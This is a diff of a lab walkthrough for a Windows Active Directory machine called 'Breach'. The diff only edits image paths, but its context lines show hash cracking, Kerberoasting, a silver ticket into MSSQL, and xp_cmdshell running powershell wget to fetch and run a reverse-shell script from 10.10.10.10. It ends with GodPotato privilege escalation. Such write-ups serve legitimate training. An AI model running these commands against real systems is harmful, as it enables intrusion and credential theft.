@@ -89,7 +89,7 @@ PROMPT OFF
 mput *
 ```
 
-![ntlm-steal](../Images/breach-ntlm-steal.png)
+![ntlm-steal](breach-ntlm-steal.png)
 
 ## NTLM hash crack
 
@@ -105,7 +105,7 @@ hashcat -m 5600 -a 0 julia-hash /usr/share/wordlists/rockyou.txt
 crackmapexec smb -U julia.wong -p "password" --shares
 ```
 
-![breach-julia-cme](../Images/breach-julia-cme.png)
+![breach-julia-cme](breach-julia-cme.png)
 
 * Upon Inspecting Julia's share we don't find anything valuable.
 
@@ -120,7 +120,7 @@ bloodhound-python -u 'julia.wong' -p 'Password' -d breach.vl -ns $IP -c all --zi
 
 * We can find the kerberoastable accounts from the report below
 
-![breach-bloodhound](../Images/breach-bloodhound.png)
+![breach-bloodhound](breach-bloodhound.png)
 
 ## Kerberoasting
 
@@ -144,7 +144,7 @@ hashcat -m 13100 -a 0 kerb-hash /usr/share/wordlists/rockyou.txt
 crackmapexec smb $IP -U svc_mssql -p 'password'
 ```
 
-![breach-mssql-cme](../Images/breach-svc-mssql-cme.png)
+![breach-mssql-cme](breach-svc-mssql-cme.png)
 
 ## Silver Ticket
 
@@ -178,7 +178,7 @@ export KRB5CCNAME=administrator.ccache
 impacket-mssqlclient -k breachdc.breach.vl
 ```
 
-![breach-mssql](../Images/breach-mssql.png)
+![breach-mssql](breach-mssql.png)
 
 * We can enable the xp_cmdshell to issue system commands as mentioned below
 
@@ -203,11 +203,11 @@ xp_cmdshell powershell wget http://10.10.10.10/rev.ps1 -O C:\Temp\rev.ps1
 xp_cmdshell powershell C:\Temp\rev.psq
 ```
 
-![breach-reverseshell](../Images/breach-reverse-shell.png)
+![breach-reverseshell](breach-reverse-shell.png)
 
 ## Privilege Escalation
 
 * as per the available privileges for the user, the SeImpersonatePrivilege can be abused to achieve System own
 * We can use [God Potato](https://github.com/BeichenDream/GodPotato) for this also by modifying the the port in the previous script
 
-![breach-root](../Images/breach-root.png)
+![breach-root](breach-root.png)
